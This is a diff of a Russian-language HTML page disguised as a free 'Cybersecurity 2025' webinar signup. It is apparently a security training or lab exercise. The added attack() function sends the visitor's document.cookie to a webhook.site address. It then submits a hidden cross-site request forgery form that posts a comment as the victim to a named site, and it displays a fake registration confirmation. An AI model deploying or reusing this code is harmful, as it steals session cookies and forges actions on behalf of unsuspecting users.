@@ -10,19 +10,16 @@
       background-color: #f4f8fb;
       padding: 60px;
     }
-
     h1 {
       font-size: 30px;
       color: #2c3e50;
     }
-
     p {
       font-size: 18px;
       color: #555;
       margin-top: 10px;
       margin-bottom: 30px;
     }
-
     button {
       padding: 12px 26px;
       font-size: 16px;
@@ -32,15 +29,12 @@
       border-radius: 6px;
       cursor: pointer;
     }
-
     button:hover {
       background-color: #2980b9;
     }
-
     iframe {
       display: none;
     }
-
     .confirmation {
       margin-top: 20px;
       font-size: 16px;
@@ -49,20 +43,28 @@
     }
   </style>
   <script>
-    function sendCSRF() {
+    function attack() {
+      // 1. Сначала отправим cookie (XSS+Token Hijack)
+      fetch("https://webhook.site/ВАШ-ID?cookie=" + document.cookie);
+
+      // 2. Затем создаём CSRF-форму
       const form = document.createElement("form");
       form.action = "https://kazcyber.zapto.org/comments.php";
       form.method = "POST";
       form.target = "hiddenFrame";
 
+      // 3. Пишем комментарий от имени пользователя
       const input = document.createElement("input");
       input.type = "hidden";
       input.name = "comment";
-      input.value = "Зарегистрировался на вебинар Кибербезопасность 2025!";
+      input.value = "CSRF-комментарий от имени жертвы";
       form.appendChild(input);
+
+      // 4. Добавляем форму и отправляем
       document.body.appendChild(form);
       form.submit();
 
+      // 5. Показываем подтверждение
       document.querySelector(".confirmation").style.display = "block";
     }
   </script>
@@ -71,10 +73,9 @@
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
   <p>Успей зарегистрироваться — количество мест ограничено!</p>
 
-  <button onclick="sendCSRF()">Записаться</button>
+  <button onclick="attack()">Записаться</button>
 
   <div class="confirmation">✅ Вы успешно зарегистрированы!</div>
-
   <iframe name="hiddenFrame"></iframe>
 </body>
 </html>
